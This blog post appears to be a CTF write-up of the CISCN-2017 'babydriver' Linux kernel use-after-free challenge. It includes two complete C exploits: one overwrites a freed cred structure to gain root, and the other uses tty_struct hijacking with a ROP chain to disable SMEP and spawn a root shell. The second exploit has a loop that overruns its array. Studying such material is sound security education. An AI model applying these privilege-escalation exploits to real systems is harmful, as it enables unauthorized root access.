---
layout:		post
title:		ctf之linux kernel pwn篇
author:		wooy0ung
tags:		pwn
category: 	writeup
---


>[索引目录]  
>0x001 pwn1(uaf)  
<!-- more -->


## 0x001 pwn1

```
题目来自CISCN-2017的babydriver
```

安装qemu
```
$ apt install qemu qemu-system
```

也可以自行编译，参考[玩转qemu之环境搭建](http://www.wooy0ung.me/note/2018/02/27/qemu-environment/)

首先打开vmware虚拟化，否则会报错
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-001.png)

把题目down下来，给了三个文件rootfs.cpio、boot.sh、bzImage，先看看boot.sh文件
```
#!/bin/bash

qemu-system-x86_64 \
-m 64M \	# 内存大小
-cpu kvm64,+smep \		# cpu类型
-smp cores=1,threads=1 \	# 开启SMEP保护
-initrd rootfs.cpio \	# 系统磁盘
-kernel bzImage \		# 内核镜像
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm -monitor /dev/null \
-s \	# 打开调试接口，相当于-gdb tcp::1234
--nographic  \
```

启动虚拟机
```
$ ./boot.sh
```

现在权限不够进不了root目录，应该是要提权了
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-002.png)

进入/lib/modules/4.4.72目录，看到babydriver.ko这个文件
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-003.png)

同时babydriver.ko也被加载到内核里了
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-004.png)

解包rootfs.cpio
```
$ mkdir rootfs
$ mv rootfs.cpio ./rootfs/rootfs.cpio.gz
$ cd rootfs
$ gunzip rootfs.cpio.gz
$ cpio -idmv < rootfs.cpio
$ rm -rf rootfs.cpio
```

找到babydriver.ko，拖到ida分析
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-005.png)

babyopen函数，device_buf分配一个64 byte的空间，device_buf_len记录下size
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-006.png)

babyrelease函数，释放掉结构体babydev_struct
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-007.png)

![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-008.png)

以及write函数
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-009.png)

exploit过程：
```
1. 打开两次文件fd1、fd2，分配了两个堆块，第一个堆块的device_buf与device_buf_len会被覆盖掉
2. 这样，release掉fd1，其实是fd2被释放掉
3. 调用babyioctl，重新分配一块与cred结构size相同的堆块
4. 新建一个进程，系统会把上面分配cred结构分配给该进程
5. 调用babywrite向cred结构写入28个0cred结构，一直覆盖到egid位
```

cred结构
```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

exp.c
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>
#define CRED_SIZE 168
#define DEV_NAME "/dev/babydev"
char buf[100];

int main() 
{
    int fd1, fd2, ret;
    char zero_buf[100];
    memset(zero_buf, 0, sizeof(char) * 100);
    fd1 = open(DEV_NAME, O_RDWR);
    fd2 = open(DEV_NAME, O_RDWR);
 
    ret = ioctl(fd1, 0x10001, CRED_SIZE);
 
    close(fd1);
 
    int now_uid = 1000;
    int pid = fork();
    if (pid < 0)
    {
        perror("fork error");
        return 0;
    }
 
    if (!pid) 
    {
        ret = write(fd2, zero_buf, 28);
        now_uid = getuid();
        if (!now_uid) 
        {
            printf("get root done\n");
            system("/bin/sh");
            exit(0);
        }
        else
        {
            puts("failed?");
            exit(0);
        }
    }
    else
    {
        wait(NULL);
    }
    close(fd2);
    return 0;
}
```

编译
```
$ gcc -Os -static exp.c -lutil -o exp
```

将exp复制到/home/ctf目录，重新打包cpio
```
$ find . | cpio -o -H newc | gzip > ../rootfs.cpio
```

执行exp
![](/assets/img/writeup/2018-04-05-linux-kernel-pwn/0x001-010.png)

记录一下另外一种解法
```
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

#define COMMAND 0x10001

#define ALLOC_NUM 50

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = 0xffffffff810a1810;
unsigned long native_write_cr4 = 0xFFFFFFFF810635B0;
unsigned long xchgeaxesp = 0xFFFFFFFF81007808;
unsigned long poprdiret = 0xFFFFFFFF813E7D6F;
unsigned long iretq = 0xFFFFFFFF8181A797;
unsigned long swapgs = 0xFFFFFFFF81063694;


void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}

void get_shell()
{
    printf("is system?\n");
    char *shell = "/bin/sh";
    char *args[] = {shell, NULL};
    execve(shell, args, NULL);
}

struct tty_operations fake_ops;

char fake_procfops[1024];

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

int main()
{

    int fd = 0;
    int fd1 = 0;
    int cmd;
    int arg = 0;
    char Buf[4096];
    int result;
    int j;
    struct tty_struct *tty;
    int m_fd[ALLOC_NUM],s_fd[ALLOC_NUM];
    int i,len;
    unsigned long lower_addr;
    unsigned long base; 
    char buff2[0x300];

    save_state();
    set_affinity(0);
    memset(&fake_ops, 0, sizeof(fake_ops));
    memset(fake_procfops, 0, sizeof(fake_procfops));
    fake_ops.proc_fops = &fake_procfops;
    fake_ops.ioctl = xchgeaxesp;
    //open two babydev
    printf("Open two babydev\n");
    fd = open("/dev/babydev",O_RDWR);
    fd1 = open("/dev/babydev",O_RDWR);

    //init babydev_struct
    printf("Init buffer for tty_struct,%d\n",sizeof(tty));
    ioctl(fd,COMMAND,0x2e0);
    ioctl(fd1,COMMAND,0x2e0);

    //race condition
    printf("Free buffer 1st\n");
    close(fd);

    printf("Try to occupy tty_struct\n");
    for(i=0;i<ALLOC_NUM;i++)
    {
    m_fd[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    if(m_fd[i] == -1)
    {
        printf("The %d pmtx error\n",i);
    }
    }

    printf("Let's debug it\n");
    lower_addr = xchgeaxesp & 0xFFFFFFFF;
    base = lower_addr & ~0xFFF;
    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
    {
        perror("mmap");
        exit(1);
    }
        unsigned long rop_chain[]= {
        poprdiret,
        0x6f0, // cr4 with smep disabled
        native_write_cr4,
        get_root_payload,
        swapgs,
        0, // dummy
        iretq,
        get_shell,
        user_cs, user_rflags, base + 0x10000, user_ss};
    memcpy(lower_addr, rop_chain, sizeof(rop_chain));

    //uaf here

    len = read(fd1, buff2, 0x20);
    if(len == -1)
    {
        perror("read");
        exit(-1);
    }
    //printf("read len=%d\n", len);

    *(unsigned long long*)(buff2+3*8) = &fake_ops;

    len = write(fd1, buff2, 0x20);
    if(len == -1)
    {
        perror("write");
        exit(-1);
    }

    for(j =0; j < 4; j++)
    {
        printf("%p\n", *(unsigned long long*)(buff2+j*8));
    }

    printf("get shell\n");

    for(i = 0; i < 256; i++)
    {
        ioctl(m_fd[i], 0, 0);//FFFFFFFF814D8AED call rax
    }
}
```

参考
[一道简单内核题入门内核利用](https://www.anquanke.com/post/id/86490)
[NCSTISC Linux Kernel PWN450 Writeup](https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html)
[kernel pwn入门(1) 简易环境搭建](http://pzhxbz.cn/?p=98)
[linux_v4.12](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118)